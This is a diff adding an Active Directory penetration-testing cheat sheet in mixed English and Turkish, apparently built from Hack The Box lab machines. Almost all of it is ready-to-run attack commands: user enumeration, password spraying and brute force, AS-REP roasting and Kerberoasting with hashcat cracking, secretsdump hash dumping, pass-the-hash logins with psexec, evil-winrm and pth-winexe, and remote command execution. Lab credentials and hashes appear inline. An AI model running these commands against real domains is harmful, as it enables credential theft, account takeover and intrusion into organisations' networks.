@@ -1,0 +1,290 @@
+         ---REMOTE ACTIVE DIRECTORY---
+  
+             --ENUM4LINUX--
+  				ENUMERATING USERS
+  enum4linux -a target-ip  #used for Null Sessions
+  enum4linux -u administrator -p password -A target-ip #used with known credentials
+  enum4linux -a -u "user" -p "password" <DC IP> => find all domain users
+  
+             --CRACKMAPEXEC--
+  You can do very much things in pentesting with cme tool) => CME ile çeşitli pentest aşamalarında yapılabilecek pek çok şey vardır ve bunlar aşağıda belirtilmiştir: 
+  Cme <target(s)> #network enumerating
+  Cme smb <target(s)> -u username -p password –local-auth -x whoami #command injection
+  Cme <target(s)> -u username -p password — lusers #list login users
+  Cme <target(s)> -u username -p password — local-auth –sam #dump local sam hashes
+  cme smb <target(s)> -u username -H ' LMHASH:NTHASH' — local-auth #passing-the-hash  // crackmapexec smb 10.10.10.175 -u administrator -H "enter hash here"
+  cme <protocol> <target(s)> -u usernames.file -p passwords.file #password brutefoce 
+  
+  -LIST SHARES SMB FILES AND GET IMPORTANT CREDENTIAL INFORMATIONS
+    crackmapexec smb 172.16.107.132 -u 'username' -p 'password' --shares
+  -PASSWORD SPRAYING
+    crackmapexec smb 10.10.10.161 --pass-pol -u ‘’ -p ‘’                      
+    crackmapexec smb 172.16.107.132 -u 'username' -p 'password' --pass-pol    
+  -PASS THE HASH
+    crackmapexec smb 172.16.107.132 -u username -p password --sam
+  
+             --RPCCLIENT--
+  rpcclient -U ‘’ ipaddress
+  >enumdomusers => enum usernames
+  >querygroup 0x47c => you can get a groupname at service accounts (group name service accounts çıkabilir.)
+  rpcclient -U''%'' ipaddress
+
+  Try Anonymous Logins
+  Rpcclient -U “” -N <IP>
+
+
+  rpcclient -U''%'' ipaddress
+  rpcclient -U support ipaddress
+  
+             --BRUTEFORCE USERNAME AND PASSOWRDS--
+  	MODUL =>		Auxiliary/scanner/smb/smb_login
+  msf auxiliary(smb_login) > set PASS_FILE   /usr/share/wordlists/ rockyou.txt
+  PASS_FILE =>   /usr/share/wordlists/rockyou.txt
+  msf auxiliary(smb_login) > set USER_FILE /root/Desktop/users.txt
+  USER_FILE => /root/Desktop/users.txt
+  msf auxiliary(smb_login) > set RHOSTS 192.168.1.2-10
+  RHOSTS => 192.168.1.2-10
+  msf auxiliary(smb_login) > set THREADS 8
+  THREADS => 8
+  msf auxiliary(smb_login) > set VERBOSE false
+  VERBOSE => false
+  msf auxiliary(smb_login) > run
+
+    SH FILE => Kinit_horizontal_brute.sh <domain> <IP> <username file> <password>
+
+            --SMBCLIENT--
+  1.SMB enumerating
+
+  smbclient -L \\Domain_Name -I <DC_IP> -N
+
+  2.if we have share and writable path on smb, We can execute psexec for remote code execution
+  (Paylaşılan yollardan herhangi birinin yazılabilir olup olmadığını kontrol
+  edin.  Herhangi bir paylaşılan yol, bilinen hesap kimlik bilgileriyle 
+  yazılabilirse, Uzaktan komut yürütme için Psexec'i kullanabiliriz.)
+
+  smbclient //<share path> -I <DC_IP> -N
+
+  3.we can execute psexec for writable path
+  (Yazılabilir yol varsa psexec çalıştıraibliriz)
+  python /opt/impacket/examples/psexec.py <domain/user>:<password>@<server ip>
+
+  4. CME is advanced and very usefull tool for automatization processes.
+  (CME, numaralandırmayı ve kullanım sonrası işlemleri otomatikleştirmek için çok yararlı bir çerçevedir.)
+  crackmapexec <IP> -u ‘<domain\username>’ -p ‘<password>’ --local-auth --shares
+
+  Önemli not: Yukarıdaki testlerden herhangi biri 
+  olumsuz sonuç verirse, Wireshark trafiğinize göz kulak olun.  Çoğunlukla
+  statik DHCP veya DNS veya Ağ Geçidi IP adresi ayarlamak bu tür 
+  sorunları çözer.  Bu, pentest'i tuhaf bir şekilde etkileyecek, hafife 
+  alınacak çok küçük bir şey. 
+
+  smbclient -L \\\\targetipaddress\\ -U V.Ventz
+  OR
+  smbclient -L \\\\targetipaddress\\ -U resourced/V.Ventz
+             
+                --SMBMAP--
+  smbmap.py -H targetip -u username -p password -d domain		# recursive directory listing
+  smbmap.py -u username -p password -d domain -x ‘net groups “DomainAdmins”/domain’ -H targetip	#command execution
+
+  smbmap -d active.htb -u svc_tgs -p Gppstillstong2k18 -H 10.10.10.100 => List directories (dizin listele)
+  smbmap -d active.htb -u svc_tgs -p Gppstillstong2k18 -H 10.10.10.100 -R Users =>can find user.txt (user.txt bulunabilir.)
+  
+                --KERBRUTE--
+   		USERNAME ENUMERATION [etki alanı adını / etc / hosts dosyasına ekleyin] 
+
+  ***Kerbrute, kaba kuvvet uygulamak ve Kerberos ön kimlik doğrulamasını 
+    kötüye kullanarak geçerli aktif dizin kullanıcılarını sıralamak için 
+    kullanılan popüler bir numaralandırma aracıdır. ***
+
+  -KERBRUTE İLE USER ENUM
+  ./kerbrute_linux_386 userenum users.txt -d Duloc.local — dc + ipaddress 
+
+  -NMAP USER ENUM
+  nmap -p 88 — script=krb5-enum-users — script-args=krb5-enum-users.realm='Duloc.local',userdb=users.txt + ipaddress 
+
+  PASSWORD SPRAYING
+  ./kerbrute_linux_386 passwordspray -d Duloc.local --dc +ipaddress+ users.txt password123
+
+  ./kerbrute userenum --dc <hostname.local> -d <domain name> <path to user-wordlist>
+
+  ./kerbrute userenum --dc <dc IP/hostname> -d <domain.local> <user list>
+
+  Credential varsa kullanıcıları crackmaexec'in — users seçeneğiyle de sıralayabilirsiniz. 
+
+  ***Kerbrute çalışmazsa, imppacket-lookupsid'i deneyin. ***(Try lookupsid if kerbrute doesn't work)
+  impacket-lookupsid <domain.local>@<DC IP>
+  
+  ***Alternative usernamelist from seclists***
+  Manuel numaralandırma size geçerli bir kullanıcı listesi sağlamazsa, şunu deneyin: 
+  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 
+
+  kerbrute userenum --dc +ipaddress+ -d EGOTISTICAL-BANK.LOCAL users.txt
+
+  ./kerbrute userenum --dc +ipaddress+ -d blackfield -o kerbrute.userenum.out users.lst => username validation (kullanıcı adları varsa userenum yapıyoruz.)
+  
+                --ASREP-ROASTING--
+  GetNPUsers.py Duloc.local/mosamba -dc-ip +ipaddress+ -no-pass
+  GetNPUsers.py Duloc.local/sshrek -dc-ip +ipaddress+ -no-pass
+  hashcat -m 18200 -a 0 hash.txt passlist.txt
+
+  impacket-GetNPUsers <domain.local>/ -no-pass -usersfile <path to users list> -format hashcat
+  [bu komut, geçerli kimlik bilgileri bulursanız da kullanılabilir, kimlik bilgileriyle farklı sonuçlar alabilir] [karmayı bir dosyaya  yapıştırın — users.txt] 
+
+  hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt 
+  
+                --KERBEROASTING--
+  GetUserSPNs.py Duloc.local/pfiona:password123! -dc-ip +ipaddress+ -request
+  hashcat -m 13100 hash.txt passwords.txt -O
+  
+                --GetNPUsers.py--
+  ./GetNPUsers.py -dc-ip 10.10.10.161 -request ‘htb.local/’ => get krb5asrep hash (krb5asrep hashı döner.)
+  crack with => hashcat -m 18200 (ile kır)
+
+  GetNPUsers.py EGOTISTICAL-BANK.local/fsmith
+  hashcat -m 18200 hashes/sauna /opt/wordlist/rockyou.txt
+
+  GetNPUsers.py -dc-ip +ipaddress+ -no-pass -usersfile users.lst blackfield/ => get krb5astep hash (krb5asrep karmasını döktü)
+  
+                --GetADUsers.py--
+  IF GOT USERNAME WE CAN GET ADUsers INFORMATION (ELİMİZDE KULLANICI ADI VARSA BİLGİ ALABİLİRİZ.)
+  GetADUsers.py -all -dc-ip +ipaddress+ Duloc.local/pfiona
+
+  GetADUsers.py -all -dc-ip +ipaddress+ active.htb/svc_tgs
+
+  GetADUsers.py -all -dc-ip +ipaddress+ domain.com/username => find all domain usernames (domain usersleri bulur)
+  
+                --GetUserSPNs.py--
+  impacket-GetUserSPNs <IP or hostname>/<username>:<password> [add -request if SPN is found]
+  SAVE THE HASH AND CRACK WITH HASHCAT [hash'i kaydedin ve hashcat ile kırın] 
+  hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt 
+
+  GetUserSPNs.py -request -dc-ip +ipaddress+ active.htb/svc_tgs => press enter and input password after get the hash (enterliyip parola girince hash karmasını veriyor.)
+  ./hashcat -m 13100 hashes/active.htb /opt/wordlist/rockyou.txt
+  
+                --WindapSearch--
+  *** Zaten kimlik bilgileriniz varsa, LDAP, AD'den birçok bilgi alabilir. 
+  • Kullanıcı verileri: Kişisel Bilgiler, Gruplar, GUID/SID, logoninfo 
+  • Gruplar, Bilgisayarlar, GPO'lar için LDAP girişleri ***
+
+  Enum Users (Kullanıcıları Numaralandır): 
+
+  ./windapsearch-linux-amd64 -d +ipaddress+ -m users -u TestOU@Duloc.local -p Ioveyou234
+
+  SPN'leri numaralandırın: 
+  ./windapsearch-linux-amd64 -d +ipaddress+ -m user-spns -u TestOU@Duloc.local -p Ioveyou234
+
+  GPO'ları numaralandırın: 
+  ./windapsearch-linux-amd64 -d +ipaddress+ -m gpos -u TestOU@Duloc.local -p Ioveyou234
+
+
+  crackmapexec smb +ipaddress+ -u 'duplicate' -p 'Ioveyou234' --shares    
+  
+  
+                 --PASSWORD SPRAYING METHODS--
+  crackmapexec smb +ipaddress+ -u users.txt -p /usr/share/wordlists/fasttrack.txt 
+  ./kerbrute_linux_386 passwordspray -d Duloc.local --dc +ipaddress+ users.txt password123
+  crackmapexec smb +ipaddress+ -u 'duplicate' -p 'Ioveyou234' --pass-pol
+  Usage: spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
+  spray.sh -smb +ipaddress+ users.txt pass.txt 3 30 Duloc.local
+  
+                  --SECRETDUMPS.PY--
+  secretsdump.py Duloc/TestOU:Ioveyou234@ipaddress
+
+  psexec.py Thelonious@ipaddress -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b 
+  yukarıdaki kodun çalışması için:
+  1. Hedefinizde RegEdit'i açın 
+  2. 2. HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System konumuna gidin 
+  3. LocalAccountTokenFilterPolicy adlı yeni bir DWORD değeri ekleyin 
+  4. Değerini 1 olarak ayarlayın 
+  5. sistemi yeniden başlat 
+
+
+  impacket-secretsdump <username>:<password>@<domain name or IP> -dc-ip <DC IP>
+
+  ./secretsdump.py domain.local/mrersec:password@ipaddress
+
+  secretsdump.py egotistical-bank.local/svc_loanmgr@ipaddress => enter bas pw gir. hashları döker.
+  
+                   --PSEXEC.PY--
+  python3 /opt/impacket/examples/psexec.py <domain>/<username>:<password>@<IP>
+  [OR] 
+  impacket-psexec.py <domain>/<username>:<password>@<IP>
+  [EXAMPLE] 
+  impacket-psexec.py xor/sqlserver:shantewhite@ipaddress
+
+  [OR] 
+  ***Hedefe yönelik credential/karmalarınız varsa, ters kabuğu istemek için 
+  crackmapexec'i kullanın ve tekrar yürütmek için kullanın. ***
+
+
+  ./psexec.py -hashes hash:hash administrator@ipaddress
+
+  psexec.py egotistical-bank.local/administrator@ipaddress -hashes hash:hash
+  
+                  --EVIL-WINRM--
+  LOG-IN WITH PASS THE HASH METHOD (PASS THE HASH İLE GİRMEK)
+  evil-winrm -i <IP> -u <user> -H <hash>
+
+  Win-pth kullanırken, boş LM hash'ini kullanıcının hash'inin başına eklemelisiniz, bunu açıklayan bir bağlantı sağlayacağım. 
+
+  Blank LM hash [always the same] — Aad3b435b51404eeaad3b435b51404ee
+  pth-winexe -U <domain>/<user>%<LM hash>:<user hash> //<IP> <command to run>
+  [Example win-pth command]:
+  pth-winexe -U svcorp/pete%aad3b435b51404eeaad3b435b51404ee:0f951bc4fdc5dfcd148161420b9c6207 //ipaddress cmd.exe
+
+  ./evil-winrm.rb -u svc-alfresco -p s3rvice -i ipaddress
+  
+                  --LDAP--
+  USER ENUM WITH LDAP (ldap ile usernameleri dök)
+  ldapsearch -h ldap://{IP} -x -s base namingcontexts
+  ldapsearch -H ldap://{IP} -x -b “DC=htb,DC=local” > ldap-anonymous.out
+  cat ldap-anonymous.out | grep -i memberof
+
+  ldapsearch -H ldap://{IP} -x -b “DC=htb,DC=local” ‘(objectClass=Person)’ sAMAccountName |grep sAMAccountName
+  ldapsearch -H ldap://{IP} -x -b “DC=htb,DC=local” ‘(objectClass=User)’ sAMAccountName |grep sAMAccountName
+  ldapsearch -H ldap://{IP} -x -b “DC=htb,DC=local” ‘(objectClass=User)’ sAMAccountName |grep sAMAccountName | awk ‘{print $2}’
+
+
+  nmap -T4 -Pn -p 389 --script ldap* ipaddress
+
+  ./windapsearch-linux-amd64 -d +ipaddress+ -m users => trying anonymous login with ldap (ldap ananim giriş dener.)
+
+  ldapsearch -x -h <IP> -s base namingcontexts
+  [Döndürülen adlandırma bağlamlarını ayrıştırın, ardından her birini numaralandırın]: 
+  ldapsearch -x -h <IP> -b ‘DC=EGOTISTICAL-BANK,DC=LOCAL’
+  [Yapabilirsiniz her adlandırma bağlamının belirli bölümlerini daha fazla sorgulayın]:
+  ldapsearch -h <IP> -x -b “DC=cascade,DC=local” ‘(objectClass=person)’
+
+  ***Çıktıyı araştırın ve ilginç parametreleri tanımlayıp 
+  tanımlayamayacağınıza bakın.  Çıktıya göre bir kullanıcı listesi 
+  oluşturabilirsiniz.  Şanslı olabilir ve şifreler gibi bazı hassas 
+  bilgiler bulabilirsiniz.  pass, pwd, password, domain, user, vs. için 
+  grep ve grepping komutunu vermeyi deneyin.***
+
+  nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>
+  
+                     --MOUNT-UMOUNT--
+  sudo umount /mnt
+sudo mount -t cifs -o ‘username=support,pasword=#00^Blackknight’ //ipaddress/profiles$ /mnt
+cd /mnt
+ls -la
+
+mount -t cifs -o username=asdsad,password=  //ipaddress/Official_Share  /mnt/Office_Share
+cd /mnt/Office_Share
+ls -la
+ls -laR
+
+mount -t cifs -o username=sadasd,password=  //ipaddress/office_share  /mnt/office_share
+  
+                      --BLLODHOUND.PY--
+python3 bloodhound.py -u support -p ‘#00BlackKnight’ -ns ipaddress -d blackfield.local -c all
+/etc/host ve /etc/resolve.conf düzenlenmesi gerekebilir.
+python3 bloodhound.py -u support -p ‘#00BlackKnight’ -d blackfield.local -c all
+
+                      --SMBCLIENT.PY--
+smbclient.py SECRET\wasdasdasdas@ipaddress
+password enter
+#use office_share
+#ls
+
+  
